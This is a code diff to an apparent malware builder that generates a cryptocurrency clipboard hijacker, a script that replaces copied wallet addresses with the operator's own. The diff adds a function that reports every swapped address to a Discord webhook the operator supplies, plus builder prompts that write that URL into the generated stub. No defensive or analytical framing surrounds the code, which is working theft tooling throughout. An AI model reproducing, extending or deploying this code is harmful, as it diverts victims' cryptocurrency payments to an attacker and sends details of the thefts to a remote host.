@@ -20,9 +20,10 @@ except ImportError:
         prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()
 
 CLIPPER_STUB = r'''
-import os, sys, time, re, subprocess
+import os, sys, time, re, subprocess, json, urllib.request
 from datetime import datetime
 
+WEBHOOK = "{webhook}"
 DEBUG = {debug}
 LOG_FILE = os.path.join(os.getenv("APPDATA", "."), "clip_log.txt")
 
@@ -49,6 +50,15 @@ REPLACEMENTS = {{re.compile(pat): (coin, addr) for coin, pat, addr in [
 ]}}
 
 dprint(f"Loaded {{len(REPLACEMENTS)}} coin replacements")
+
+def send_webhook(text):
+    if not WEBHOOK: return
+    try:
+        data = json.dumps({{"content": f"🪙 **Crypto Clipper**\\n```\\n{{text}}\\n```"}}).encode()
+        req = urllib.request.Request(WEBHOOK, data=data,
+                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
+        urllib.request.urlopen(req, timeout=10)
+    except: pass
 
 def get_clip():
     try:
@@ -84,6 +94,7 @@ def log_swap(coin, orig, repl):
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{coin}}: {{orig[:30]}} -> {{repl[:30]}}\n")
         dprint(f"Swap logged to {{LOG_FILE}}")
+        send_webhook(f"**{{coin}}** swapped\\nOriginal: `{{orig[:40]}}`\\nReplaced: `{{repl[:40]}}`")
     except Exception as e:
         dprint(f"Log write error: {{e}}")
 
@@ -175,6 +186,11 @@ def run(kevbin=None):
             if not replacements:
                 cprint("  \033[91m[X] No addresses configured\033[0m"); pause(); continue
             print()
+            webhook = prompt("  \033[96mDiscord Webhook URL (empty to skip notifications): \033[0m").strip()
+            if webhook and 'discord' not in webhook:
+                cprint("  \033[91m[X] Invalid webhook, skipping\033[0m"); webhook = ""
+            if debug_mode:
+                _debug_print("WEBHOOK", webhook[:40] + "..." if webhook else "NONE")
             if debug_mode:
                 _debug_print("CONFIG", f"{len(replacements)} coins configured")
             rep_lines = []
@@ -183,6 +199,7 @@ def run(kevbin=None):
             rep_block = "\n".join(rep_lines)
             stub = CLIPPER_STUB.replace("{replacements}", rep_block)
             stub = stub.replace("{debug}", "True" if debug_mode else "False")
+            stub = stub.replace("{webhook}", webhook or "")
             out = prompt("  \033[96mOutput filename (default: clipper.py): \033[0m").strip() or "clipper.py"
             if not out.endswith('.py'): out += '.py'
             if debug_mode:
@@ -236,6 +253,7 @@ def run(kevbin=None):
             clear()
             stub = CLIPPER_STUB.replace("{replacements}", '    ("BTC", "^[13]...", "YOUR_BTC"),\n    ("ETH", "^0x...", "YOUR_ETH"),')
             stub = stub.replace("{debug}", "False")
+            stub = stub.replace("{webhook}", "WEBHOOK_URL_HERE")
             print(stub)
         else:
             cprint("  \033[91mInvalid choice\033[0m")
